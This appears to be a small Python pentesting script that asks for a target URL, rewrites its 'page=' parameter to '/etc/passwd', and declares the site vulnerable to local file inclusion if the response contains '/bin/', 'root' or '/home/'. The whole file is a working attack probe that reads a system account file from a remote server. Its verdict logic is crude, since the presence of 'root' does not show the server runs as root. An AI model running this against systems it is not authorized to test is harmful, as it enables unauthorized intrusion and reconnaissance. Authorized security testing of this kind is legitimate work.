import requests, sys

"""
	Local File Inclusion Vulnerability Checker
		Released for pentesting
"""

class Main:
	def __init__(self):
		self.url = str(input("Target URL: ")) # Gets URL (target) as user input.

	def url_filter(self):
		if "page=" in self.url: # Examine if the URL has valid parameters.
			print("\nTarget Matches LFI parameters!\nCommencing Request!") # If valid parameters returns success to user and continues
			self.send_request()
		else:
			sys.exit("Target Does Not Match LFI parameters!\nPlease try agian.") # If URL does not match the valid parameters gives error

	def send_request(self):
		self.mix = self.url.split("=") # Splits URL with the "="
		self.output = requests.get(self.mix[0] + "=/etc/passwd") # Sends request, with changed url to check for the vulnerability
		self.filter_output(self.output.text) # Filters Output

	def filter_output(self, output):
		if "/bin/" in output: # If "/bin/" in response continue
			if "root" in output:
				sys.exit("\nTarget is Vulnerable!\nWebserver is running on root.") # If "root" in response server is vulnerable and on root
			else:
				sys.exit("\nTarget is Vulnerable!") # If not "root" server is still vulnerable, just not on root

		elif "/home/" in output: # If "/bin/" not found then look for "/home/"
			sys.exit("Target is Vulnerable!") # If found return success

		else:
			sys.exit("Target is secure and not vulnerable to L.F.I.") # If none were found return statement saying that target is secure


if __name__ == '__main__':
	main = Main()
	main.url_filter()
